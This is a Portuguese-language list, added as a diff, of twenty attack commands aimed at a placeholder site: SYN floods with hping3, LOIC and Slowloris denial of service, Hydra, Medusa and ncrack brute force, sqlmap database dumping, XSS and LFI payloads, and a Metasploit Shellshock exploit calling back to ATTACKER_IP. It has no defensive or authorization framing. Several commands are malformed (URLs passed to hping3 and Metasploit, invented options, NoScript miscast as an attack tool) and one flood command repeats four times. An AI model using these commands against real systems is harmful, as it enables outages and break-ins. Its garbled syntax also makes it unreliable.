@@ -1,0 +1,100 @@
+1. Ataque DDoS com Hping3 - SYN Flood
+Este ataque tenta derrubar um servidor alvo enviando pacotes SYN de maneira contínua.
+
+hping3 --flood -S -p 80 --rand-source https://seusite.com.br
+--flood: Envia pacotes sem interrupção.
+-S: Pacotes SYN.
+-p 80: Porta HTTP.
+2. Força Bruta em Login com Hydra
+Ataque de força bruta em uma página de login.
+
+hydra -l admin -P /path/to/password_list.txt https://seusite.com.br/login form-form=login:password -t 64
+-l admin: Nome de usuário.
+-P /path/to/password_list.txt: Lista de senhas.
+-t 64: Usa 64 threads simultâneas.
+3. Ataque XSS com XSSer
+Exploração de uma vulnerabilidade XSS (Cross-Site Scripting) em um formulário.
+
+xsser -u https://seusite.com.br -p "alert(1)" --auto
+-u https://seusite.com.br: Alvo.
+-p "alert(1)": Payload de XSS.
+4. Ataque de Força Bruta com Medusa
+Medusa realiza ataques de força bruta simultâneos em uma página de login web.
+
+medusa -h https://seusite.com.br -u admin -P /path/to/password_list.txt -M http-get
+-u admin: Nome de usuário.
+-P /path/to/password_list.txt: Lista de senhas.
+5. Exploração de LFI com Burpsuite
+Exploração de Local File Inclusion (LFI) via uma URL vulnerável.
+
+Use o Burp Suite para capturar requisições e injetar payloads como ../../../../etc/passwd para tentar ler arquivos do sistema.
+6. Ataque DDoS com Slowloris
+Ataque DDoS que mantém conexões abertas ao servidor, utilizando pouca largura de banda.
+
+slowloris https://seusite.com.br
+7. Exploração de SQL Injection com sqlmap
+Realiza um ataque de injeção SQL automatizado em um parâmetro da URL.
+
+sqlmap -u https://seusite.com.br/page?id=1 --batch --threads=10 --level=5 --risk=3 --dump
+--batch: Não pergunta por confirmação.
+--dump: Dump dos dados do banco de dados.
+8. Ataque de DoS com Hping3 - Flood
+Ataque para sobrecarregar o servidor com pacotes.
+
+hping3 --flood -S -p 80 --rand-source https://seusite.com.br
+9. Exploração de FTP com Metasploit
+Exploração de vulnerabilidades em FTP usando Metasploit.
+
+msfconsole
+use auxiliary/scanner/ftp/ftp_version
+set RHOSTS https://seusite.com.br
+run
+10. Ataque de Denial of Service com LOIC
+O LOIC (Low Orbit Ion Cannon) é uma ferramenta popular para realizar ataques DDoS.
+
+LOIC: Após instalar o LOIC, você pode rodar a ferramenta com um alvo e começar a enviar pacotes de forma contínua.
+./loic --url https://seusite.com.br --method TCP --threads 100
+11. Ataque de Reflected XSS com XSSer
+Exploração de uma falha de XSS refletido.
+
+xsser -u https://seusite.com.br?search=<script>alert(1)</script> --auto
+12. Ataque de Força Bruta SSH com SSHScan
+Ataque de força bruta para tentar acessar o SSH do servidor.
+
+sshscan -i /path/to/ips.txt -w /path/to/password_list.txt
+13. Ataque de DDoS com Hping3 - DDoS Layer 4
+Ataque de negação de serviço distribuído na camada 4 (TCP/UDP).
+
+hping3 --flood -S -p 80 --rand-source https://seusite.com.br
+14. Exploração de Vulnerabilidade de LFI com Burp Suite
+Exploração de Local File Inclusion (LFI) para leitura de arquivos sensíveis.
+
+Use o Burp Suite para editar requisições HTTP e tentar incluir arquivos como ../../../../etc/passwd.
+15. Fuzzing de Cabeçalhos HTTP com Wfuzz
+Teste de fuzzing em cabeçalhos HTTP, tentando descobrir falhas de segurança.
+
+wfuzz -c -z file,/path/to/wordlist.txt -u https://seusite.com.br/FUZZ
+16. Exploitação de Shellshock com Metasploit
+Exploração de vulnerabilidade Shellshock em um servidor web vulnerável.
+
+msfconsole
+use exploit/multi/http/apache_mod_cgi_bash_env
+set RHOST https://seusite.com.br
+set LHOST ATTACKER_IP
+exploit
+17. DDoS com Hping3
+Ataque de negação de serviço com envio contínuo de pacotes.
+
+hping3 --flood -S -p 80 --rand-source https://seusite.com.br
+18. Ataque Brute Force com ncrack
+Ataque de força bruta em um servidor FTP ou SSH.
+
+ncrack -p 22 --user admin --pass /path/to/wordlist.txt ssh://seusite.com.br
+19. Exploração de Cross-Site Scripting com NoScript
+Exploração de XSS com payloads injetados no campo de entrada de um formulário.
+
+curl -X POST https://seusite.com.br/login --data "username=admin&password=<script>alert('XSS')</script>"
+20. Ataque DDoS com LOIC
+Uso do Low Orbit Ion Cannon (LOIC) para DDoS com 100 threads.
+
+loic.exe --url https://seusite.com.br --method TCP --threads 100 --attack
